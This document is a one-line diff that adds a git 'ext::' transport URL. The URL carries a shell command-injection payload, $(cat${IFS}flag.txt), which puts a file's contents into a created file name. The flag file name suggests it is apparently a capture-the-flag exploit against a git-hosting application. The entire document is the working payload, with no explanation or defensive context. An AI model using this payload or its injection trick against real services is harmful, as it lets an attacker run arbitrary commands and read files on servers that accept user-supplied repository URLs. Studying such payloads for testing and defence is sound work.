@@ -1,0 +1,1 @@
+ext::sh+-c+touch%25+./repositories/GetHub/$(cat${IFS}flag.txt)
